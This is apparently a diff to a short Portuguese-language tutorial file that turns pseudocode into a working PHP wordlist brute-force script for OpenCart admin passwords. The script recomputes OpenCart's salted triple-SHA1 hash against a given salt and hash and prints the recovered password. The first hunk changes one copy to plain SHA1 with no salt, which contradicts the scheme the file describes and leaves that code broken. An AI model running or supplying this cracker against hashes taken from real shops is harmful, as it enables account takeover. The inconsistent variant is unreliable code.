@@ -22,7 +22,7 @@ $password = "f2e9efd4a366507c5b1cba7749659d93d61ae335";
 $lines = file('wordlis.txt', FILE_IGNORE_NEW_LINES);
 foreach($lines as $string)
 {
-   $hashed=SHA1($salt.SHA1($salt.SHA1($string)));
+   $hashed=SHA1($string);
    if($hashed==$password){echo "SENHA: ".$string;}else{}
 }
 ?>
@@ -59,24 +59,18 @@ obs: ignorei a parte `OR password = '" . $this->db->escape(md5($password)) . "')
 ###### Um script php de força bruta em senhas OpenCart Ficaria algo do tipo:
 
 
-```
-INICIO:
-
-$wordlist_string[] = WORDLIST.TXT
-
+```php
+<?php
 $salt = "oInuc412L";
 $password = "f2e9efd4a366507c5b1cba7749659d93d61ae335";
-$comparative = SHA1($salt.SHA1($salt.SHA1($wordlist_string[0])));
 
-SE $comparative IGUAL A $password
-	ENTÃO: A SENHA É : $comparative
-
-SE NÃO
-	$comparative = SHA1($salt.SHA1($salt.SHA1($wordlist_string[++])));;
-	COMPARA A $comparative COM A $password
-FIM.
-
-ASSIM SUCESSIVAMENTE ATÉ TERMOS $comparative == $password
+$lines = file('wordlis.txt', FILE_IGNORE_NEW_LINES);
+foreach($lines as $string)
+{
+   $hashed=SHA1($salt.SHA1($salt.SHA1($string)));
+   if($hashed==$password){echo "SENHA: ".$string;}else{}
+}
+?>
 ```
 
 ###### _DUVIDAS? SUGESTÕES?: [pablov3rlly gmail com]_
